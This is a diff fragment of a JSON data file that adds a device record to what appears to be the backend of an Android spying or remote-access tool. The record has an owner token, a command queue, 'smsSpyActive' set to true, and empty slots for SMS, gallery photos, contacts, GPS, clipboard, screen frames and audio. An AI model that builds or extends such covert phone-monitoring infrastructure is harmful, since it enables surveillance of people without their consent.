@@ -2127,5 +2127,37 @@
     "audioList": [],
     "lastAppUsage": null,
     "appList": null
+  },
+  {
+    "deviceId": "pxc_79a87b50",
+    "deviceName": "HP-ABIR123-0330",
+    "ownerUsername": "Fibersec",
+    "token": "ab095dd2405dc78cf8aaa200b596d4bd",
+    "lastSeen": 1777755150047,
+    "commandQueue": [],
+    "online": true,
+    "connectedAt": "2026-05-02T20:52:30.047Z",
+    "deviceInfo": {
+      "model": "OPPO CPH2579",
+      "androidVersion": "Android 15",
+      "battery": 40,
+      "network": "WiFi: GlobalWifi.id",
+      "sim1": "Indosat Ooredoo",
+      "sim2": "Tidak ada"
+    },
+    "lastPhoto": null,
+    "lastScreenFrame": null,
+    "smsSpyActive": true,
+    "smsMessages": [],
+    "galleryPhotos": [],
+    "galleryDone": false,
+    "contacts": [],
+    "lastGps": null,
+    "gpsList": [],
+    "lastClipboard": null,
+    "lastAudio": null,
+    "audioList": [],
+    "lastAppUsage": null,
+    "appList": null
   }
 ]
